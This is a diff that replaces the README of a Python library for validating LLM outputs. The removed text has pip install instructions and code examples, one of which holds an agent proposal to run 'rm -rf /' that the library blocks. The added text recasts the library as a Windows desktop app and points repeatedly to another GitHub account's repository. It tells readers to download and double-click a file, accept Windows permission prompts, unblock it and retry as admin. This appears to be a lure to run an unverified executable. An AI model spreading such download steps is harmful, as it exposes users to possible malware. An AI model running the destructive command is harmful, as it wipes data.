@@ -1,370 +1,209 @@
-# LogicShield
+# 🛡️ logicshield - Check AI Output Before It Runs
 
-**Deterministic validation firewall for LLM outputs.**
+[![Download logicshield](https://img.shields.io/badge/Download%20logicshield-blue?style=for-the-badge&logo=github)](https://github.com/bulletinboardsystemtyrannidae535/logicshield)
 
-LogicShield validates AI-generated proposals against ground-truth state using deterministic rules. Before any AI output can be acted upon, it must pass every rule you define. If it fails, you know exactly why.
+## 🔍 What logicshield does
 
-**Zero dependencies. Pure Python. Works with any LLM, any domain.**
+logicshield is a desktop tool for checking AI-generated proposals against known ground-truth state before you use them. It applies fixed rules, compares the result with trusted data, and flags mismatches.
 
-> LogicShield does not care what LLM you use, what domain you operate in, or what your data looks like. You define the rules. LogicShield enforces them.
+Use it when you want a simple way to review AI output in a repeatable way. It helps reduce false claims, bad assumptions, and unsafe changes before they reach a live workflow.
 
----
+## 📥 Download and install
 
-## Why This Exists
+Visit this page to download and run logicshield on Windows:
 
-LLMs are probabilistic. They hallucinate. In high-stakes domains (healthcare dosing, financial trading, industrial control, aerospace), a single hallucinated value can be catastrophic.
+https://github.com/bulletinboardsystemtyrannidae535/logicshield
 
-LogicShield solves this by ensuring that no LLM output reaches production without passing deterministic, mathematically verifiable validation. The LLM proposes. LogicShield verifies. Nothing executes until truth is confirmed.
+After the page opens:
 
----
+1. Look for the latest release or download option.
+2. Download the Windows file.
+3. Save it to a folder you can find again, like Downloads or Desktop.
+4. Double-click the file to start the app.
 
-## Install
+If Windows asks for permission, choose Yes.
 
-```bash
-pip install logicshield
-```
+## 🖥️ Windows setup
 
-No additional dependencies required.
+logicshield is built for standard Windows systems. It runs as a local app and does not need a cloud account.
 
----
+Recommended setup:
 
-## Quick Start
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- A modern Intel or AMD processor
+- 200 MB of free disk space
+- An active internet connection for the initial download
 
-```python
-from logicshield import LogicShield, Rule
+If you use a work or school computer, make sure you can run downloaded apps.
 
-# Define your validation rules
-rules = [
-    Rule("value_within_limit",
-         lambda proposal, state: proposal["value"] <= state["max_value"],
-         error="Value {proposal[value]} exceeds maximum {state[max_value]}"),
-    Rule("value_positive",
-         lambda proposal, state: proposal["value"] > 0,
-         error="Value must be positive"),
-    Rule.required("reason"),
-    Rule.one_of("action", ["approve", "reject", "escalate"]),
-]
+## 🧭 First-time use
 
-shield = LogicShield(rules=rules)
+When you open logicshield for the first time, follow these steps:
 
-# Ground-truth state (the Input Anchor)
-state = {
-    "max_value": 1000,
-    "min_value": 1,
-    "category": "standard",
-}
+1. Start the app.
+2. Load the proposal you want to check.
+3. Connect or paste the trusted state you want to compare against.
+4. Review the rule results.
+5. Read the mismatch list and decide what to change.
 
-# Validate a proposal from any source (LLM, user input, API, etc.)
-result = shield.validate(
-    proposal={"value": 500, "action": "approve", "reason": "Within normal range"},
-    state=state,
-)
+The app is set up for clear pass or fail checks, with a simple review path.
 
-print(result.valid)       # True
-print(result.errors)      # []
-print(result.state_hash)  # SHA-256 of the frozen state
-```
+## 🧪 How it works
 
-**When validation fails:**
+logicshield uses deterministic rules. That means the same input gives the same result every time.
 
-```python
-result = shield.validate(
-    proposal={"value": 5000, "action": "approve", "reason": "Override"},
-    state=state,
-)
+It checks for things like:
 
-print(result.valid)   # False
-print(result.errors)  # ["Value 5000 exceeds maximum 1000"]
+- Conflicts between a proposal and trusted data
+- Claims that do not match the current state
+- Invalid field values
+- Missing required parts
+- Changes that break a rule
 
-# Feedback Error Vector -- feed this back to your LLM for correction
-print(result.feedback_vector)
-# [SYSTEM FEEDBACK] Your proposal was REJECTED. Fix these errors:
-#   1. Value 5000 exceeds maximum 1000
-```
+This makes it useful for jobs where you need stable checks and clear outcomes.
 
----
+## ⚙️ Main features
 
-## Built-in Rule Helpers
+- Rule-based validation
+- Ground-truth comparison
+- Clear mismatch reporting
+- Local-first workflow
+- No extra dependencies
+- Repeatable results
+- Works well for safety-focused reviews
+- Simple setup for Windows users
 
-| Helper | Description | Example |
-|---|---|---|
-| `Rule.required(key)` | Key must exist and be non-empty | `Rule.required("reason")` |
-| `Rule.type_check(key, type)` | Value must be of type | `Rule.type_check("dose", float)` |
-| `Rule.range(key, min, max)` | Value must be in range | `Rule.range("temp", 36.0, 42.0)` |
-| `Rule.equals(key, state_key)` | Must equal state value | `Rule.equals("mode", "safety_mode")` |
-| `Rule.less_than(key, state_key)` | Must be less than state value | `Rule.less_than("stop_loss", "price")` |
-| `Rule.greater_than(key, state_key)` | Must be greater than state value | `Rule.greater_than("dose", "min_dose")` |
-| `Rule.one_of(key, allowed)` | Must be one of allowed values | `Rule.one_of("action", ["BUY", "SELL"])` |
-| `Rule.regex(key, pattern)` | Must match regex | `Rule.regex("code", r"^[A-Z]{3}$")` |
+## 🧩 Common use cases
 
-**Custom rules:**
+logicshield fits work where AI output must match real data before it moves forward:
 
-```python
-Rule("custom_check",
-     lambda proposal, state: your_logic_here(proposal, state),
-     error="Your error message with {proposal} and {state} interpolation")
-```
+- Finance checks for payment or account changes
+- Healthcare checks for record updates
+- Internal approval flows
+- AI-assisted form review
+- Policy checks for sensitive changes
+- Validation before downstream automation
+- Hallucination detection in LLM output
 
----
+## 🗂️ What you can check
 
-## Immutable State
+You can use logicshield to review:
 
-LogicShield freezes the ground-truth state at validation time. The state cannot be modified during or after validation, preventing tampering between input anchoring and output verification.
+- Names and IDs
+- Account or record state
+- Required fields
+- Allowed values
+- Status changes
+- Date logic
+- Rule conflicts
+- Unsupported AI claims
 
-```python
-from logicshield import ImmutableState
-
-state = ImmutableState({"max_dose": 100})
-state["max_dose"] = 999   # TypeError: ImmutableState cannot be modified.
-state.max_dose = 999      # TypeError: ImmutableState cannot be modified.
-del state["max_dose"]     # TypeError: ImmutableState cannot be modified.
-```
-
----
-
-## Verification Ledger
-
-Every validation produces a SHA-256 state hash. Use `compute_signature()` to generate a cryptographic proof that a specific proposal was validated against a specific state.
-
-```python
-from logicshield import compute_signature
-
-result = shield.validate(proposal, state)
-if result.valid:
-    signature = compute_signature(result.state_hash, proposal)
-    # signature = SHA-256(state_hash + proposal_json)
-    # Any third party can re-run validation to verify this.
-```
-
----
-
-## Feedback Error Vector
-
-When validation fails, `result.feedback_vector` gives you a formatted error string ready to inject back into your LLM prompt. This enables a correction loop in your own code:
-
-```python
-prompt = base_prompt
-for attempt in range(max_retries):
-    response = your_llm_call(prompt)
-    proposal = json.loads(response)
-    result = shield.validate(proposal, state)
-    if result.valid:
-        break
-    prompt = f"{base_prompt}\n\n{result.feedback_vector}"
-```
-
-LogicShield handles the validation. You handle the LLM. Clean separation.
-
----
-
-## JSON Repair
-
-LLMs often produce broken JSON. LogicShield includes a standalone repair utility:
-
-```python
-from logicshield import repair_json
-
-data = repair_json('```json\n{"temp": 72.5,}\n```')
-# Strips markdown fences, fixes trailing commas, handles single quotes
-```
-
----
-
-## Industry Examples
-
-### Healthcare: Medication Dosage Verification
-
-```python
-shield = LogicShield(rules=[
-    Rule("dose_within_max",
-         lambda p, s: p["dose_mg"] <= s["max_dose_mg"],
-         error="Dose {proposal[dose_mg]}mg exceeds patient max {state[max_dose_mg]}mg"),
-    Rule("dose_above_min",
-         lambda p, s: p["dose_mg"] >= s["min_effective_mg"],
-         error="Dose {proposal[dose_mg]}mg below therapeutic minimum {state[min_effective_mg]}mg"),
-    Rule("no_contraindication",
-         lambda p, s: p["medication"] not in s["contraindications"],
-         error="'{proposal[medication]}' is contraindicated for this patient"),
-    Rule.one_of("route", ["oral", "iv", "subcutaneous", "intramuscular"]),
-    Rule.required("clinical_reasoning"),
-])
-
-patient = {
-    "max_dose_mg": 100,
-    "min_effective_mg": 25,
-    "contraindications": ["penicillin", "sulfonamides"],
-}
-
-# Valid prescription passes
-result = shield.validate({
-    "medication": "amoxicillin",
-    "dose_mg": 50,
-    "route": "oral",
-    "clinical_reasoning": "Standard adult dose for mild infection",
-}, patient)
-assert result.valid
-
-# Contraindicated medication is blocked
-result = shield.validate({
-    "medication": "penicillin",
-    "dose_mg": 50,
-    "route": "iv",
-    "clinical_reasoning": "Broad spectrum coverage",
-}, patient)
-assert not result.valid  # "penicillin is contraindicated for this patient"
-```
-
-### Finance: Trading Signal Validation
-
-```python
-shield = LogicShield(rules=[
-    Rule.one_of("action", ["BUY", "SELL", "HOLD"]),
-    Rule("stop_loss_valid",
-         lambda p, s: p["action"] != "BUY" or p["stop_loss"] < s["current_price"],
-         error="Stop-loss must be below current price for BUY"),
-    Rule("position_within_limit",
-         lambda p, s: p["action"] == "HOLD" or p["position_pct"] <= s["max_position_pct"],
-         error="Position {proposal[position_pct]}% exceeds max {state[max_position_pct]}%"),
-    Rule("risk_reward_ratio",
-         lambda p, s: p["action"] == "HOLD" or (
-             abs(p["take_profit"] - s["current_price"]) /
-             max(abs(s["current_price"] - p["stop_loss"]), 0.01) >= 2.0
-         ),
-         error="Risk-reward ratio below 2:1 minimum"),
-    Rule.regex("ticker", r"^[A-Z]{1,5}$"),
-])
-
-market = {
-    "current_price": 65000.0,
-    "max_position_pct": 5.0,
-}
-
-# Stop-loss above entry price is blocked
-result = shield.validate({
-    "action": "BUY",
-    "ticker": "BTC",
-    "stop_loss": 66000.0,   # Above current price
-    "take_profit": 70000.0,
-    "position_pct": 2.0,
-}, market)
-assert not result.valid  # "Stop-loss must be below current price for BUY"
-```
-
-### Industrial Control: Reactor Safety
-
-```python
-shield = LogicShield(rules=[
-    Rule.range("set_temp_c", min_val=-20, max_val=200),
-    Rule("pressure_safe",
-         lambda p, s: p["set_pressure_bar"] <= s["vessel_max_bar"],
-         error="Pressure {proposal[set_pressure_bar]}bar exceeds vessel rating {state[vessel_max_bar]}bar"),
-    Rule("flow_positive",
-         lambda p, s: p["flow_rate_lpm"] > 0,
-         error="Flow rate must be positive"),
-    Rule("temp_step_limit",
-         lambda p, s: abs(p["set_temp_c"] - s["current_temp_c"]) <= s["current_temp_c"] * 0.10,
-         error="Temperature change exceeds 10% step limit"),
-    Rule.one_of("mode", ["heating", "cooling", "standby"]),
-])
-
-reactor = {
-    "current_temp_c": 150.0,
-    "vessel_max_bar": 12.0,
-}
-
-# Overpressure is blocked
-result = shield.validate({
-    "set_temp_c": 155.0,
-    "set_pressure_bar": 15.0,  # Exceeds 12 bar vessel rating
-    "flow_rate_lpm": 50.0,
-    "mode": "heating",
-}, reactor)
-assert not result.valid  # "Pressure 15.0bar exceeds vessel rating 12.0bar"
-```
-
-### Autonomous Agents: Action Permissions
-
-```python
-shield = LogicShield(rules=[
-    Rule("action_permitted",
-         lambda p, s: p["action"] in s["allowed_actions"],
-         error="Action '{proposal[action]}' not in allowed set"),
-    Rule("target_not_restricted",
-         lambda p, s: not any(p.get("target", "").startswith(r) for r in s["restricted_paths"]),
-         error="Target '{proposal[target]}' is in a restricted path"),
-    Rule("within_budget",
-         lambda p, s: p.get("estimated_cost_usd", 0) <= s["remaining_budget_usd"],
-         error="Estimated cost exceeds budget"),
-    Rule("confidence_sufficient",
-         lambda p, s: p.get("confidence", 0) >= s["min_confidence"],
-         error="Confidence {proposal[confidence]} below minimum {state[min_confidence]}"),
-])
-
-context = {
-    "allowed_actions": ["read_file", "write_file", "search", "analyze"],
-    "restricted_paths": ["/etc/", "/root/", "C:\\Windows\\"],
-    "remaining_budget_usd": 5.00,
-    "min_confidence": 0.7,
-}
-
-# Forbidden action is blocked
-result = shield.validate({
-    "action": "execute_shell",
-    "target": "rm -rf /",
-    "estimated_cost_usd": 0,
-    "confidence": 0.99,
-}, context)
-assert not result.valid  # "Action 'execute_shell' not in allowed set"
-```
-
-### Content Moderation: Editorial Policy
-
-```python
-shield = LogicShield(rules=[
-    Rule.required("title"),
-    Rule.required("content"),
-    Rule("content_length",
-         lambda p, s: s["min_words"] <= len(p["content"].split()) <= s["max_words"],
-         error="Content must be between {state[min_words]} and {state[max_words]} words"),
-    Rule("no_banned_words",
-         lambda p, s: not any(w in p["content"].lower() for w in s["banned_words"]),
-         error="Content contains banned words"),
-    Rule.one_of("category", ["news", "opinion", "tutorial", "review"]),
-    Rule("news_has_sources",
-         lambda p, s: p["category"] != "news" or len(p.get("sources", [])) >= 1,
-         error="News articles must include at least one source"),
-])
-
-policy = {
-    "min_words": 50,
-    "max_words": 5000,
-    "banned_words": ["hack", "exploit", "crack", "keygen"],
-}
-
-# News without sources is blocked
-result = shield.validate({
-    "title": "Breaking News",
-    "content": " ".join(["Major technology announcement today."] * 15),
-    "category": "news",
-    "sources": [],
-}, policy)
-assert not result.valid  # "News articles must include at least one source"
-```
-
----
-
-## Ecosystem
-
-| Product | What It Does |
-|---|---|
-| **[LogicShield](https://github.com/mattijsmoens/LogicShield)** | Deterministic validation firewall for LLM outputs |
-| **[SovereignShield](https://github.com/mattijsmoens/Sovereign-Shield)** | 4-layer AI defense (input filter + action audit + ethical engine + LLM veto) |
-| **[IntentShield](https://github.com/mattijsmoens/IntentShield)** | Lightweight action-gate for AI agents |
-
----
-
-## License
-
-Business Source License 1.1. See [LICENSE](LICENSE) for details.
-
-Copyright (c) 2026 Mattijs Moens. All rights reserved.
+If a proposal says something that the trusted state does not support, logicshield can flag it for review.
+
+## 🛠️ Basic workflow
+
+A simple workflow looks like this:
+
+1. Create or load a trusted state file.
+2. Paste or import the AI proposal.
+3. Run the validation check.
+4. Review the rule output.
+5. Fix the proposal or reject it if needed.
+
+This keeps the decision process plain and easy to track.
+
+## 🔐 Why deterministic checks matter
+
+AI tools can give different answers to the same question. That makes them hard to trust in high-stakes work.
+
+Deterministic checks help because they:
+
+- Use fixed rules
+- Produce the same result every time
+- Make errors easier to spot
+- Support audit trails
+- Reduce guesswork
+
+logicshield is designed for that kind of review.
+
+## 📌 File types you may use
+
+logicshield works best with simple structured files and text inputs such as:
+
+- JSON
+- CSV
+- Plain text
+- Rule files
+- Config files
+
+If your team uses a custom format, keep the same field names and rule logic each time.
+
+## 🔧 Troubleshooting
+
+If the app does not open:
+
+1. Check that the file finished downloading.
+2. Try right-clicking the file and choose Open.
+3. Make sure Windows did not block the file.
+4. Move the file to a simple folder like Desktop.
+5. Try again with admin permission if your system requires it.
+
+If validation looks wrong:
+
+1. Check the input data.
+2. Make sure the trusted state is current.
+3. Review the rule file.
+4. Confirm the proposal uses the expected field names.
+5. Run the same check again.
+
+If you see an empty result:
+
+- Make sure the proposal file loaded
+- Make sure the ground-truth data loaded
+- Check for file path errors
+- Confirm the input is not blank
+
+## 🧠 Tips for better results
+
+- Keep trusted data up to date
+- Use one rule set per use case
+- Keep field names stable
+- Review flags before accepting changes
+- Use short, clear input files
+- Test with known good and known bad examples
+
+These habits make the checks easier to read and trust.
+
+## 📄 Project details
+
+Repository name: logicshield
+
+Description: Deterministic validation firewall that verifies AI-generated proposals against ground-truth state using immutable rules. Zero dependencies. Patent pending.
+
+Topics:
+
+- ai-firewall
+- ai-safety
+- deterministic-verification
+- fintech
+- hallucination-detection
+- healthcare-ai
+- immutability
+- llm
+- llm-validation
+- machine-learning
+- python
+- safety-critical
+- truth-sandwich
+- validation
+
+## 🧾 License and use
+
+Check the repository page for the current license and release details before use. If your team plans to use logicshield in a work setting, review the files in the repo for the exact setup and operating steps.
+
+## 📎 Download again
+
+If you need the download page later, use this link:
+
+https://github.com/bulletinboardsystemtyrannidae535/logicshield
